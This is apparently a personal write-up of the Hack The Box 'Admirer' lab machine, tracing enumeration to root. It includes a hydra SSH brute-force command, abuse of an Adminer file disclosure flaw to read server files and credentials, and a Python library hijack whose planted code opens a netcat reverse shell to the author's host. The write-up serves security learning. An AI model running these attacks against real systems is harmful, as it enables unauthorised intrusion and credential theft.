---
title: Admirer
date: 2020-06-11
hero: /images/posts/hack-the-box/admirer.png
categories:
- hack-the-box
tags:
- linux
- adminer
- database
- mysql
- python escalation
---

# Admirer

```
export IP=10.10.10.187
```

## Tools

* nmap
* firefox
* gobuster
* nikto
* hydra
* netcat
* python
* mysql

## Walkthrough

First thing's first, let's do the `nmap` scan. I use the command `sudo nmap -sS -sV $IP`.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 17:04 EDT
Nmap scan report for 10.10.10.187
Host is up (0.056s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds
```

As usual for HTB machines there is a web server on port 80 and `SSH` is open. Let's start looking around. While we are looking at the webpage I am going to run a `gobuster` scan in the background with the command `gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt`.

While looking at the website I went to `robots.txt` and found out that there is a directory called `/admin-dir`. This is something we should checkout. If we try and navigate to the directory, we are not allowed to view it, that's okay, we will get there eventually! Let's see the output of our `gobuster` scan.

Looks like we didn't find too much we didn't already know.

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/11 17:12:10 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/06/11 17:12:36 Finished
===============================================================
```

I am going to run another `gobuser` scan and I added the argument `-x .php,.txt,.html` so that I can look for file extensions. Again no results, so I am going to try one more time with the wordlist `/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt`. This list is over 20 times larger than the last one. I might be beating a dead horse here but hopefully something interesting will pop up.

Okay so I am back after a while and I have a new idea. I am trying to enumerate the home directory, but what about the directory that we had found earlier. Let's try to use the command `gobuster dir -u http://$IP/admin-dir/ -w /usr/share/dirb/wordlists/common.txt -x .php,.txt,.html`. We found something new! It looks like there is something at the domain `http://$IP/admin-dir/contacts.txt`. It even gives us a 200 response code so we should be able to view its contents. Look's like it has the names and email addresses of designers and developers of the `admirer` app. This might help us brute force an `ssh` login. Let's try using `hydra` on a set of usernames that include the names we found in the file. Here is the command I used `hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $IP ssh`.

While waiting for `hydra` to run I also tried an anonymous `ftp` login but I just got permission denied. Also if we don't find any `ssh` credentials we could always try hydra on `ftp`. Wait a second... haha I am such a fool. I bet the `ssh` and `ftp` passwords are the same. So if I can't brute force `ssh` the I probably will not be able to use `hydra` on `ftp`. While waiting for `hydra` and another `gobuster` scan to be completed, I stumbled upon the HTB fourms and read a few posts about this box. There was a hint about this box's name being similar to that of a database, so I did a quick google search and found [this](https://www.adminer.org/) link. There is a database called `adminer`. That is pretty similar to the name of our box. Let's read up some more about this database and maybe do some manual enumeration.

After trying a few different paths from `adminer`'s GitHub page I didn't find much.

```

adminer/index.php - Run development version of Adminer
editor/index.php - Run development version of Adminer Editor
editor/example.php - Example customization
plugins/readme.txt - Plugins for Adminer and Adminer Editor
adminer/plugin.php - Plugin demo
adminer/sqlite.php - Development version of Adminer with SQLite allowed
editor/sqlite.php - Development version of Editor with SQLite allowed
adminer/designs.php - Development version of Adminer with adminer.css switcher
compile.php - Create a single file version
lang.php - Update translations
tests/katalon.html - Katalon Automation Recorder test suite
```

This is a list of the ones I tried. I also started a `nikto` scan using the command `nikto -host http://$IP`. My `nikto` scan didn't show much, a little disappointing. However, we got a new file from another `gobuster` scan. I used the command `gobuster dir -u http://$IP/admin-dir/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.txt,.html`. It took quite a while, but I found the file `/admin-dir/credentials.txt`. It looks like it has some WP credentials, `ftp` credentials and some email credentials. Let's see what the `ftp` login gets us.

After trying to log in we are successful, awesome! There is a database dump and some compressed file, let's exfiltrate both of them so we can take a look around. We were stuck in the home directory of the `ftpuser`, so this is all we could get.

In the `html.tar.gz` folder we got all the contents on the website. You can find the ungziped version in the directory `html`. I found some interesting file in the directory `utility-scripts`. There are some `.php` files having to do with administrator privileges, so let's investigate those in the web browser and see if we can access them.

Something I found in the `utility-scripts/info.php` file that I think is funny is that it says `Adminer` version 4.9 is running, but on the `Adminer` GitHub page the latest version is 4.7. We can also access the page `utility-scripts/admin_tasks.php` on the website. This might be a lead! From this page we can see that there is a user named `waldo` logged into the machine. This person also appeared on the credentials page exfiltrated from the `ftp` server. Let's see if we can `ssh` into the machine on the user `waldo` with any of the credentials we found. Ouch and after trying the server with all the passwords we have found so far we are not lucky. I guess it is time to look at `dump.sql`.

Well another disappointing lead, it looks like the `dump.sql` file just contains the descriptors for the images on the server. Boo hoo.

What's strange is that of all the files that we exfiltrated from the `utility-scripts` directory the only file that does not exist is `db_admin.php`. I don't know the significance, but it is something to note.

Okay so I finally found something interesting. I used `ffuf -u http://$IP/utility_scripts/FUZZ -w /usr/share/dirb/wordlists/big.txt -e .php,.txt,.html`. This popped up that there is a file called `adminer.php`. This gives us a login page. I am not sure what the DB stuff means, but we can try and use the credentials we have found in hopes that we can use something. I tried using the credentials `waldo::Wh3r3_1s_w4ld0?` but didn't have any luck. However at the top of the page there is a version number: 4.6.2. This is not the most recent version so let's look up some exploits. Turns out that this version of adminer has a big file disclosure vulnerability. You can read about it [here](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability) and [here](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool).

I have been having a lot of trouble starting my `mysql` server on my machine. I wasn't able to connect for a while. However here is what I figured out.

Use the command `sudo service mysql start` to start the server. Next use the command `sudo mysql` to connect to the `mysql` shell. Now here goes a series of commands.

```
CREATE DATABASE admirer;
use admirer;
CREATE USER 'htb'@'%' IDENTIFIED BY 'hacker';
GRANT ALL PRIVILEGES ON * . * TO 'htb'@'%';
FLUSH PRIVILEGES;
CREATE TABLE test(data VARCHAR(255));
```

Now that we have user and it's privileges set we need to set the `bind-address` to 0.0.0.0 in `/etc/mysql/mariadb.conf.d/50-server.cnf`.

Now that this is all set we can connect to our server on the login page by filling out the following information.

```
Server: 10.10.14.22 (this your internal htb ip, find it on the Access page)
username: htb
password: hacker
database: adminer
```

Then boom we connect. We have come a long way to get this far! So close to user I can feel it. Now we need to try and exfiltrate the user's password. Let's investigate. We can enter SQL commands into this website. So based on the command suggested in the second article, we should be able to use `LOAD DATA LOCAL INFILE '/etc/shadow' INTO TABLE test`, looks like we are not allowed to view that file... surprise. Let's try using the query `LOAD DATA LOCAL INFILE '../index.php' INTO TABLE test` because that is where we found some credentials from the files we got via `ftp`. This is what we found:

```
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

If we try using these credentials to `ssh` into the machine they work! User success. Here is the hash that was on my machine `f0c71b0bad8032c9cf59393f1eb7d3e5`.

Now to try and escalate to root! Right off the bat I ran the command `sudo -l` to see what commands `waldo` could run. We can see that there is a script called `admin_tasks.sh` if we try and run it we get the same options that were on the web interface. I tried to create a password backup but was unable due to insufficient permissions.

There is also a few backup that have been created. If we do the command `find \ | grep .bak | grep .bak` the we can find another password backup that has been created. Unfortunately we are not allowed to access this file again. I tried catting out the `.bash_history` of the users, but it looks like they are all being piped to `/dev/null`.

Now I downloaded the post exploit script linenum to the server and ran it to see if anything will stand out. I got lenenum from the repo [here](https://raw.githubusercontent.com/Open-Sec/LinEnum/master/LinEnum.sh). Okay... so I don't really know what I am reading, but nothing really stands out to me. However after doing `sudo -l` again I realized that I could run the `admin_tasks.sh` as root. So I can create the `passwd.bak` file. However I still cannot read it. Let's see if we can alter the code in the shell script. I am silly. My target is not `passwd.bak` because I can already read it at `/etc/passwd`.

Right now my idea is to some how abuse the fact that when we do `sudo -l` that we have something to do with `SETENV`. I am thinking that we can preserve the `EUID` that the shell script is executed as. Because we know that we can execute `admin_tasks.sh` as root. So there has got to be a way that we can maintain the `EUID` from this process, essentially making us the `root` user. There is also a call to the file `backup.py` in our shell script that we have permission to run. Maybe this could be an attack vector as well, because technically the `backup.py` gets run as root as well. Let's do some research. I found [this](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7) article. It has to do with being able too write to the file that the python module is importing. Let's see if we can locate this `shutil.py` file. Well it looks like we do not have permission to edit the `shutil.py` file. But what if we can create our own and make the python file being ran to look there. Let's try this in `waldo`'s home directory. I would say do it in `/tmp`, but the machine deletes `/tmp` frequently so it would be a pain to work in. Okay so let's create a file called `shutil.py`. In there we need the same method signature that is in the real `shutil.py` file for the `make_archive` method. In this method we don't need any of the arguments, we just need the method to be called. So I want to spawn a reverse shell. Here is what I have.

```
import os
def make_archive(a, b, c):
  os.system("nc 10.10.14.29 1234 -e'/bin/sh'")
```

Now from here I thought we could just run the script from this directory, but that is not the case. Turns out that this file needs to be in the python `sys.path` I tried adding it to the `sys.path` using some choppy code, but it did not work. Then I read about setting the environmental variable `PYTHONPATH` to so I set it to `/home/waldo`. That didn't work either. But after a hint, it turns out that what we need to do is run it all together as SUDO. First set up your listener on your local machine. Here we run the command `nc -lvnp 1234`, then on the server we need to run the following command: `sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh` then select 6. If you set up your listener on your local machine then it should work. Type `whoami` on the reverse shell and you are root! Congratulations. Now to cat out the `/root/root.txt` file. Overall this was a very difficult box for me. I probably worked on it for 8+ hours, but I feel like I learned a lot. Onto the next box!

```
Working Credentials:
ftpuser::%n?4Wz}R$tTF7
waldo::&<h5b~yK3F#{PaPB&dA}{H>
```

```
URLS:
|$IP/admin-dir/
||- contacts.txt
||- credentials.txt  
|$IP/utility-scipts/
||- info.php
||- admin_tasks.php
||- phptest.php
||- adminer.php
|$IP/server-status
```
